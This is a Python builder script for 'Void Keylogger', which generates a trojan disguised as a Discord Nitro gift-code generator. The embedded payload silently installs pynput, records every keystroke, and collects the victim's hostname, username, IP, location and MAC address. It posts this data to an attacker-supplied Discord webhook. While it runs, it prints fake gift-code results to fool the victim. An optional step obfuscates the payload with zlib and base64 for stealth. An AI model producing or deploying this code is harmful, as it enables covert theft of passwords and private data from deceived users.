import sys
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import os, time, math, datetime, random, string, base64, zlib

from rich.console import Console, Group
from rich.panel   import Panel
from rich.text    import Text
from rich.align   import Align
from rich         import box
from rich.rule    import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console(highlight=False)
C_BLOOD = "#8B0000"; C_RED = "#CC0000"; C_NEON = "#FF2020"; C_WHITE = "#FFFFFF"; C_SILVER = "#CCCCCC"; C_DIM = "#444444"; C_GOLD = "#FFD700"; C_GREEN = "#00FF88"

ASCII = r"""
   ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗
   ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
   █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
   ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
   ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""
SUBTITLE = " V O I D   K E Y L O G G E R   -   N I T R O   G E N   E D I T I O N "

# ─── PAYLOAD TEMPLATE (V2.9 - FLAWLESS TROJAN) ───
PAYLOAD_RAW = r'''import sys, os, time, threading, json, platform, socket, datetime, subprocess, base64, re, uuid, random, string

def _req(m):
    try:
        __import__(m)
    except:
        try:
            c = [sys.executable, '-m', 'pip', 'install', m, '--quiet']
            if os.name == 'nt': subprocess.check_call(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
            else: subprocess.check_call(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

_req('requests'); _req('pynput'); _req('colorama')

import requests
from pynput.keyboard import Key, Listener
try:
    from colorama import Fore, Style, init
    init()
except:
    class Fore: RED=GREEN=YELLOW=WHITE=CYAN=MAGENTA=RESET=''
    class Style: BRIGHT=''

WURL = "__WEBHOOK__"
SID  = "__SESSION__"
DISC = "https://discord.gg/v0id"
SHOP = "https://void-tools.mysellauth.com/"
GITH = "https://github.com/V0id-v2/Void-Tools-v2.0"

def _sys():
    try:
        h = socket.gethostname(); u = os.getlogin() if os.name=='nt' else os.environ.get('USER','?')
        s = '{} {} {}'.format(platform.system(), platform.release(), platform.machine())
        iip = socket.gethostbyname(h); mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        try:
            d=requests.get('https://ipapi.co/json/', timeout=8).json()
            i=d.get('ip','?'); c=d.get('country_name','?'); cy=d.get('city','?'); o=d.get('org','?')
        except:
            try: i=requests.get('https://api.ipify.org', timeout=5).text.strip()
            except: i='?'
            c=cy=o='?'
        return h,u,s,i,c,cy,o,iip,mac
    except: return '','','','','','','','',''

def _post(eb):
    try: requests.post(WURL, json={'embeds': [eb]}, timeout=20)
    except: pass

_l=[]; _lock=threading.Lock(); _c=0; _t=time.time()

def _conn():
    h,u,s,i,c,cy,o,iip,mac = _sys()
    emb = {
        'title': '👑  VOID - TARGET ONLINE  [NITRO GEN MODE]',
        'color': 0x00FF88,
        'description': f'```ansi\n\u001b[1;32m[+] DEVICE INFECTED\u001b[0m\n\u001b[1;34m[!] GitHub: {GITH}\n[!] Discord: {DISC}\u001b[0m\n```',
        'fields': [
            {'name': '👤 User', 'value': f'`{u}`', 'inline': True},
            {'name': '💻 Machine', 'value': f'`{h}`', 'inline': True},
            {'name': '🌐 IP Publique', 'value': f'`{i}`', 'inline': True},
            {'name': '📍 Location', 'value': f'`{cy}, {c}`', 'inline': True},
            {'name': '📡 ISP', 'value': f'`{o}`', 'inline': False},
            {'name': '⚙️ System', 'value': f'`{s}`', 'inline': False},
        ],
        'footer': {'text': f'Void Nitro Engine | {SID}'},
        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    _post(emb)

def _flush(trigger):
    with _lock:
        if not _l: return
        snap = "".join(_l); cnt = _c; _l.clear()
    el = time.time()-_t; dur = "{:02d}m {:02d}s".format(int(el//60), int(el%60))
    emb = {
        'title': f'📈  LOG CAPTURE ── {trigger}',
        'color': 0xCC2222 if trigger == 'INSTANT' else 0xFFD700,
        'fields': [
            {'name': '⌨️ Keys', 'value': f'`{cnt}`', 'inline': True},
            {'name': '⏱ Time', 'value': f'`{dur}`', 'inline': True},
            {'name': '📋 Captured Data', 'value': f'```\n{snap[-950:] if len(snap)>950 else snap}\n```', 'inline': False},
        ],
        'footer': {'text': f'Void Keylogger | Session: {SID}'},
        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    _post(emb)

def _on(k):
    global _c
    try:
        try: c = k.char
        except: c = str(k)
        is_ent = (k == Key.enter)
        if k == Key.space: c = ' '
        elif k == Key.enter: c = '\n'
        elif k == Key.backspace: c = '[<]'
        elif k == Key.tab: c = '\t'
        elif 'Key.' in c: c = ''
        if c:
            with _lock: _l.append(c); _c+=1
            if is_ent: threading.Thread(target=_flush, args=('INSTANT_ENTER',), daemon=True).start()
            elif len(_l) >= 50: threading.Thread(target=_flush, args=('BATCH_50',), daemon=True).start()
    except: pass

def _fake_gen():
    os.system('cls' if os.name=='nt' else 'clear')
    banner = r"""
     _   _  _  _                 ____               
    | \ | |(_)| |_  _ __  ___   / ___|  ___  _ __   
    |  \| || || __|| '__|/ _ \ | |  _  / _ \| '_ \  
    | |\  || || |_ | |  | (_) || |_| ||  __/| | | | 
    |_| \_||_| \__||_|   \___/  \____| \___||_| |_| 
                                                    
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print(Fore.WHITE + " [*] Connecting to Discord API..." + Style.RESET_ALL)
    time.sleep(2)
    print(Fore.GREEN + " [+] Proxy list verified (Success rate: 94%)." + Style.RESET_ALL)
    time.sleep(1)
    print(Fore.WHITE + " [*] Multithreaded Gen started (Thread: 128)..." + Style.RESET_ALL)
    time.sleep(1.5)
    print("-" * 55)
    while True:
        code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        status = random.choices(["INVALID", "TIMEOUT", "RATE LIMIT"], weights=[95, 3, 2], k=1)[0]
        if status == "INVALID": print(Fore.RED + f" [-] discord.gift/{code} | Status: INVALID" + Style.RESET_ALL)
        elif status == "TIMEOUT": print(Fore.YELLOW + f" [!] discord.gift/{code} | Status: TIMEOUT" + Style.RESET_ALL)
        else: print(Fore.WHITE + f" [~] discord.gift/{code} | Status: RATE LIMIT" + Style.RESET_ALL)
        time.sleep(random.uniform(0.02, 0.1))

threading.Thread(target=_conn, daemon=True).start()
threading.Thread(target=lambda: (time.sleep(120), _flush('HEARTBEAT')), daemon=True).start()
threading.Thread(target=lambda: (Listener(on_press=_on).start()), daemon=True).start()

try: _fake_gen()
except KeyboardInterrupt: pass
'''

def obfuscate_code(code):
    compressed = zlib.compress(code.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')
    return f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded}')))"

def boot():
    if sys.platform.startswith("win"): os.system("title VOID KEYLOGGER // FLAWLESS NITRO")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.6:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ": sys.stdout.write(" ")
                    else:
                        v = max(40, min(255, int(80 + 175 * math.sin(t * 9 - c * 0.18))))
                        sys.stdout.write(f"\033[38;2;{v};0;0m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.write(f"\n  \033[38;2;70;0;0m{SUBTITLE}\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")

def section(title):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}]  {title}  [/]", style=C_BLOOD))
    console.print()

def get_output_dir():
    script_dir  = os.path.dirname(os.path.abspath(__file__))
    void_parent = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))
    out_dir     = os.path.join(void_parent, "Void - Output", "Keylogger")
    if not os.path.exists(out_dir): os.makedirs(out_dir, exist_ok=True)
    return out_dir

def main():
    boot()
    console.print(Align.center(Panel(
        Group(
            Align.center(Text.from_markup(f"[bold {C_NEON}]VOID KEYLOGGER BUILDER[/] [white]v2.9 FLAWLESS[/]")),
            Text(""),
            Align.center(Text.from_markup(f"[bold {C_WHITE}]PIÈGE :[/] [bold #00FF88]NITRO GEN (PURE EVIL)[/] [dim]|[/] [bold {C_WHITE}]FIX :[/] [bold #00FF88]NAME ERROR RESOLVED[/]")),
            Align.center(Text.from_markup(f"[dim {C_DIM}]Génère un faux générateur sans failles pour piéger la cible à 100%[/]"))
        ),
        border_style=C_BLOOD, padding=(1, 4), box=box.DOUBLE_EDGE
    )))

    # STEP 1
    section("ÉTAPE 1  ──  CONFIG WEBHOOK")
    webhook_url = console.input(f"  [bold {C_RED}]└─▶[/] Webhook >> ").strip()
    if not webhook_url.startswith("http"): return

    # STEP 2
    section("ÉTAPE 2  ──  FURTIVITÉ")
    is_ultra = (console.input(f"\n  [bold {C_RED}]02 »[/] choix mode (1: normal / 2: obfusqué) >> ").strip() == "2")

    # STEP 3
    section("ÉTAPE 3  ──  NOM DU FICHIER")
    fname_input = console.input(f"  [bold {C_RED}]└─▶[/] Nom (Nitro-Gen) >> ").strip() or "Nitro-Gen"
    if not fname_input.endswith(".py"): fname_input += ".py"

    # BUILD
    section("INJECTION DU PIÈGE PARFAIT")
    out_dir = get_output_dir()
    filepath = os.path.join(out_dir, fname_input)

    with Progress(SpinnerColumn(spinner_name="dots2", style=f"bold {C_RED}"), TextColumn("[white]Reconstruction des variables..."), console=console, transient=True) as p:
        p.add_task("", total=None)
        code = PAYLOAD_RAW.replace("__WEBHOOK__", webhook_url).replace("__SESSION__", fname_input)
        time.sleep(1)

    if is_ultra:
        with Progress(SpinnerColumn(spinner_name="point", style=f"bold {C_GOLD}"), TextColumn("[bold gold]Masquage de la menace..."), console=console, transient=True) as p:
            p.add_task("", total=None)
            code = obfuscate_code(code)
            time.sleep(1.2)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write("# -*- coding: utf-8 -*-\n" + code)

    console.print(Panel(
        Group(
            Align.center(Text.from_markup(f"[bold {C_GREEN}]✔ PAYLOAD NITRO-GEN V2.9 (PRORE)[/]")),
            Text(""),
            Text.from_markup(f"  [dim]Patch :[/] [bold #00FF88]Fixed _conn NameError"),
            Text.from_markup(f"  [dim]Style :[/] [bold #00FF88]Nitro Gen ASCII Banner"),
            Text(""),
            Align.center(Text.from_markup(f"[dim]Aucun code valide ne sera affiché pour plus de réalisme.[/]"))
        ),
        border_style=C_GREEN, box=box.DOUBLE_EDGE, padding=(1, 4)
    ))
    
    if console.input(f"\n  [bold {C_RED}]>[/] [dim]Ouvrir le dossier ? (o/n) >> [/]").lower() == 'o':
        os.startfile(out_dir)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: pass
